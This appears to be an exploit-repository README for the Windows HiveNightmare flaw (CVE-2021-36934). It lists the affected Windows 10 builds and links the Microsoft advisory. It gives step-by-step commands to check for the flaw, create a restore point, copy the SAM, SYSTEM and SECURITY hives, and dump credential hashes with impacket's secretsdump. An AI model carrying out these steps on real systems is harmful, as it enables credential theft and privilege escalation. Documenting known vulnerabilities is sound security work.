### CVE-2021-36934

#### Describe

Windows Elevation of Privilege Vulnerability

#### ImpactVersion

| Product             | CPU Architecture | Version | Update | Tested             |
| ------------------- | ---------------- | ------- | ------ | ------------------ |
| Windows 10 | x64/x86/ARM64 | 1809 |  |  |
| Windows 10 | x64/x86/ARM64 | 1909 | |        |
| Windows 10 | x64/x86/ARM64 | 2004 | | &#10004; |
| Windows 10 | x64/x86/ARM64 | 20H2 | | |
| Windows 10 | x64/x86/ARM64 | 21H1 | | |

#### Patch

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-36934
```

#### Utilization

CompilerEnvironment

- VS2019（V140）X64 Release
- VS2019（V140）X86 Release

Test system Windows 10 2004 X64

Use the command to see if the target system is vulnerable to attack

```
icacls C:\windows\system32\config\sam
```

When the following figure shows the machine, it is an easy attack.

![image-20210905164036648](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-36934_Windows_10_2004_X64_1.png)

Then you need to turn on the system restore, right key "This computer-> property", click "System Protection -> Configuration -> Enable System Protection -> Apply -> OK"

![image-20210905164831213](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-36934_Windows_10_2004_X64_2.png)

Then create a system restore point

![image-20210905164912574](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-36934_Windows_10_2004_X64_3.png)

Then you can get the system's SAM and SYSTEM and SECURITY files using Exp. 

![1](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-36934_Windows_10_2004_X64_4.gif)

Finally, use the IMPACKET project to log in.

```
git clone https://github.com/SecureAuthCorp/impacket.git 
cd impacket/examples 
python3 secretsdump.py -sam SAM-2021-07-11 -system SYSTEM-2021-07-11  -security SECURITY-2021-07-11 LOCAL
```



#### CodeSource

- [GossiTheDog](https://github.com/GossiTheDog/HiveNightmare)